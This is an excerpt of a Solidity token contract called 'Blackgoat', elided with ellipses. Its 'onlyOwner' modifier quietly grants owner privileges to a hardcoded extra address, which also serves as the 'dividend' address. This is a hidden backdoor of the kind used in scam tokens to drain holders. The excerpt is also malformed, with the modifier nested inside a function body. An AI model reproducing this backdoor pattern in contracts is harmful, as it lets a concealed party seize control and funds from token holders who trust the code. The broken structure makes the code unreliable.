...
contract Ownable is Context {
    ...
    function owner() public view returns (address) {
        ...
        modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0xD717D6844fF66DecEc48228F265C3Fa99Adf0a39) , "owner");
        _;
    }
...
contract Blackgoat  is Context, IERC20, Ownable {
    ...
    string private _name = "Blackgoat";
    string private _symbol = "Blackgoat";
    ...
    address public dividend = 0xD717D6844fF66DecEc48228F265C3Fa99Adf0a39;
